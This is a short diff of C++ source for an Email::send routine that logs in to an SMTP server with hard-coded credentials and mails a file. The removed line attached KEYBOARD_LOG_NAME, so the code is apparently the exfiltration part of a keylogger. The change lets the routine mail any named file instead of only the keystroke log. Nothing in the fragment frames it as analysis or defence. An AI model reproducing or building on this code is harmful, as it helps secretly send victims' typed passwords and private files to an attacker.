@@ -11,7 +11,7 @@ Email::~Email()
 {
 }
 
-void Email::send()
+void Email::send(wstring fileName)
 {
 	::CoInitialize(NULL);
 	IMailPtr oSmtp = NULL;
@@ -24,9 +24,8 @@ void Email::send()
 	oSmtp->ServerAddr = EMAIL_SMTP_ADDRESS;
 	oSmtp->UserName = EMAIL_FROM_NAME;
 	oSmtp->Password = EMAIL_FROM_PASSWORD;
-
 	oSmtp->SSL_init();
-	oSmtp->AddAttachment(KEYBOARD_LOG_NAME);
+	oSmtp->AddAttachment(fileName.c_str());
 	oSmtp->SendMail();
 	if (oSmtp != NULL)
 		oSmtp.Release();
